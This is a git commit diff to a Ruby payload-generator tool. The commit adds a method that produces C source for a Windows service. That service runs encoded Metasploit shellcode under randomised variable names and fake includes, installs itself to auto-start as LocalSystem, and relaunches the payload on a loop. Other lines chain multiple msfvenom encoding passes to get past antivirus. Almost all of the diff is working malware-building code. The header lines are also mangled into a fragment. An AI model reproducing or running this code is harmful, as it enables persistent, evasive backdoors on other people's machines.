ecc14f7a295549fbeb4ec308a2d642be0845e2a7
Green-m <greenm.xxoo@gmail.com>
2018-04-16 02:54:26 -0400

    Add service code

--- lib/payloadmaker.rb
+++ lib/payloadmaker.rb
@@ -1,5 +1,4 @@
-#!/usr/bin/env ruby
-# -*- coding: binary -*-
+nary -*-
 # Code by Green-m
 # Test  on ruby 2.3.3
 $LOAD_PATH.unshift(File.dirname(__FILE__))
@@ -9,6 +8,7 @@ require 'antisandbox'
 class PayloadMaker
 
     def initialize(options = {})
+        @options = options
         @shellcode = options[:shellcode]
         @encoder = options[:encoder] || true
         #@platform = platform
@@ -308,6 +308,255 @@ class PayloadMaker
         code << "}"
     end
 
+    # Code to install meterpreter service 
+    def compile_service # CreateThread
+        shellcode = @shellcode
+        rand_buf = random_funcname()
+        rand_name1 = random_funcname()
+        rand_name2 = random_funcname()
+        rand_name3 = random_funcname()
+        rand_name4 = random_funcname()
+
+        service_name = @options[:service_name] 
+        display_name = @options[:display_name] 
+        sleep_time   = @options[:sleep_time]   
+
+        # define variables
+        shellcode.sub!('unsigned char buf[] = ',"unsigned char #{rand_buf}[] = ")
+        string_mod_functions = ["byte *#{rand_name1} = #{rand_buf};\n","DWORD #{rand_name2} = 0;\n","typedef void (WINAPI *#{rand_name3})();\n"].shuffle!.join()
+
+
+        # code construction
+        code =  "#include <windows.h>\n"
+        code << "#include <stdio.h>\n"
+        code << fake_includes.join("\n")
+        code << "\n"
+        code << %Q{#define SERVICE_NAME  "#{service_name}" \n}
+        code << %Q{#define DISPLAY_NAME  "#{display_name}"\n}
+        code << "#define SLEEP_TIME #{sleep_time}\n"
+        code << "SERVICE_STATUS ServiceStatus;\n"
+        code << "SERVICE_STATUS_HANDLE ServiceStatusHandle;\n"
+
+
+        # Connect to service 
+        code << "\n"
+        code << "int ConnectService(){\n"
+
+
+        code << shellcode 
+        code << "\n"
+
+        # Declare variables
+        code << string_mod_functions
+        
+        # run shellcode functions
+        code << "VirtualProtect(#{rand_name1},sizeof(#{random_memory}),PAGE_EXECUTE_READWRITE,&#{rand_name2});\n"  
+        code << "#{rand_name3} #{rand_name4} = (#{rand_name3})&#{rand_buf}[0];\n"
+        code << "#{rand_name4}();\n"
+        code << "return 0;"
+        code << "}"
+
+        # service main code
+        code << %q^
+
+                void start_shell()
+                {   
+                    DWORD err = 0;
+                    char path[MAX_PATH];
+                    char cmd[MAX_PATH];
+
+                    if (GetModuleFileName(NULL, path, sizeof(path)) == 0) {
+                        err = GetLastError();
+                        return ;
+                        
+                    }
+
+                    STARTUPINFO startup_info;
+                    PROCESS_INFORMATION process_information;
+
+                    ZeroMemory(&startup_info, sizeof(startup_info));
+                    startup_info.cb = sizeof(startup_info);
+
+                    ZeroMemory(&process_information, sizeof(process_information));
+                    if (CreateProcess(path, path, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL,
+                                      NULL, &startup_info, &process_information) == 0)
+                    {
+                        return;
+                    }
+                    WaitForSingleObject(process_information.hProcess, INFINITE);
+
+                }
+
+
+                void ServiceControlHandler(DWORD request) {
+                    switch (request) {
+                    case SERVICE_CONTROL_STOP:
+                    case SERVICE_CONTROL_SHUTDOWN:
+                        
+                        ServiceStatus.dwWin32ExitCode = 0;
+                        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+                        break;
+
+                    case SERVICE_CONTROL_PAUSE:
+                        ServiceStatus.dwWin32ExitCode = 0;
+                        ServiceStatus.dwCurrentState = SERVICE_PAUSED;
+                        break;
+
+                    case SERVICE_CONTROL_CONTINUE:
+                        ServiceStatus.dwWin32ExitCode = 0;
+                        ServiceStatus.dwCurrentState = SERVICE_RUNNING;
+                        break;
+                    default:
+                        break;
+                    }
+
+                    
+                    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
+
+                    return;
+                }
+
+                void ServiceMain(int argc, char** argv) {
+                    
+                    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
+                    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
+                    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+                    ServiceStatus.dwWin32ExitCode = 0;
+                    ServiceStatus.dwServiceSpecificExitCode = 0;
+                    ServiceStatus.dwCheckPoint = 0;
+                    ServiceStatus.dwWaitHint = 0;
+
+                    ServiceStatusHandle = RegisterServiceCtrlHandler(
+                        SERVICE_NAME, 
+                        (LPHANDLER_FUNCTION)ServiceControlHandler
+                        );
+                    if (ServiceStatusHandle == 0) {
+                                exit(1);
+                    }
+
+                    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
+                    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
+
+                    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
+
+                        start_shell(); 
+                        Sleep(SLEEP_TIME);
+
+                    }
+                    return;
+                }
+
+                BOOL install_service()
+                {
+                    SC_HANDLE hSCManager;
+                    SC_HANDLE hService;
+
+                    char path[MAX_PATH];
+
+                    if (!GetModuleFileName(NULL, path, MAX_PATH)) {
+                                return FALSE;
+                    }
+
+                    char cmd[MAX_PATH];
+                    int len = _snprintf(cmd, sizeof(cmd), "\"%s\" service", path);
+
+                    if (len < 0 || len == sizeof(cmd)) {
+                        return FALSE;
+                    }
+
+                    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+
+                    if (hSCManager == NULL) {
+                                return FALSE;
+                    }
+
+
+                    hService = CreateService(
+                        hSCManager,
+                        SERVICE_NAME,
+                        DISPLAY_NAME,
+                        SERVICE_ALL_ACCESS,
+                        SERVICE_WIN32_OWN_PROCESS,
+                        SERVICE_AUTO_START,
+                        SERVICE_ERROR_NORMAL,
+                        cmd,
+                        NULL,
+                        NULL,
+                        NULL,
+                        NULL,   /* LocalSystem account */
+                        NULL
+                    );
+
+                    if (hService == NULL) {
+
+                        CloseServiceHandle(hSCManager);
+                        return FALSE;
+                    }
+                    
+                    char* args[] = { path, "service" };
+
+                    if (StartService(hService, 2, (const char**)&args) == 0) {
+                        DWORD err = GetLastError();
+
+                        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
+
+                            CloseServiceHandle(hService);
+                            CloseServiceHandle(hSCManager);
+                            return FALSE;
+                        }
+                    }
+
+
+                    CloseServiceHandle(hService);
+                    CloseServiceHandle(hSCManager);
+                    
+                    return TRUE;
+                }
+
+
+                void start_service()
+                {
+                    SERVICE_TABLE_ENTRY ServiceTable[] =
+                    {
+                        { SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
+                        { NULL, NULL }
+                    };
+
+                    if (StartServiceCtrlDispatcher(ServiceTable) == 0) {
+                        exit(1);
+                    }
+                }
+
+
+                int main(int argc, char** argv) {
+
+                     if (argc == 2) {
+
+                        if (strcmp(argv[1], "install") == 0) {
+                            
+                            install_service();
+                            return 0;
+                        }
+
+                        else if (strcmp(argv[1], "service") == 0) {
+                        
+                            start_service();
+                            return 0;
+                        }
+
+                    }
+                    
+                    ConnectService();
+                    return 0;
+                }
+
+
+                ^
+
+    end
+
+
+
     def compile_random
         compile_functions = []
         self.methods.each {|x|
@@ -365,7 +614,7 @@ class MsfRunner
         encoder_array = get_encoder
         msfstring =  "msfvenom -p #{@payload}  lhost=#{@host}  lport=#{@port} #{@other} -f raw -e #{encoder_array[0]} -i #{random_number(10..15)} |"
         msfstring << "msfvenom -e #{encoder_array[1]} -a x86 --platform windows -f raw -i #{random_number(2..4)} |"
-        msfstring << "msfvenom -e #{encoder_array[2]} -a x86 --platform windows -f c -i #{random_number(2..4)}"
+        msfstring << "msfvenom -e #{encoder_array[2]} -a x86 --platform windows -f c -i #{random_number(2..4)} -t 300"
 
         # debug
         #msfstring =  "msfvenom -p #{@payload}  lhost=#{@host}  lport=#{@port} #{@other} -f c -e x86/jmp_call_additive -i #{random_number(10..15)} "
@@ -398,13 +647,8 @@ class MsfRunner
             exit
         end
 
-        
-        
-
         # payload size
         output_line payload_size
-
-
 
         shellcode
     end
